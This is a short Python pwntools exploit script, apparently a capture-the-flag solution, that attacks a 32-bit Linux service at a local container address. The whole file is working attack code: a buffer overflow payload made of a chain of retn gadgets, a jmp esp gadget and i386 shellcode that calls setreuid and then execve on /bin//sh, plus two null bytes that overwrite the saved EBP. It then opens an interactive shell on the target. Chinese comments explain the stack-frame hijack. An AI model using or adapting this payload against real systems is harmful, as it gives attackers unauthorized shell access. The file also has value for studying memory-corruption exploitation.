#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.3', 10001)

shellcode = "\x6A\x31\x58\xCD\x80\x89\xC3\x89\xC1\x6A\x46\x58\xCD\x80\x31\xC0\x31\xD2\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"

payload = ""
payload += p32(0x080484b5)*56		#retn 类似于NOP slide技术，通过一系列retn一直执行到jmp esp，从而执行shellcode
payload += p32(0x0804859f)			#jmp esp
payload += shellcode
payload += '\x00\x00'				#修改栈中EBP的最后一位，通过两个leave劫持栈帧，将栈降低，使retn跳到retn slide上

io.send(payload)
io.interactive()
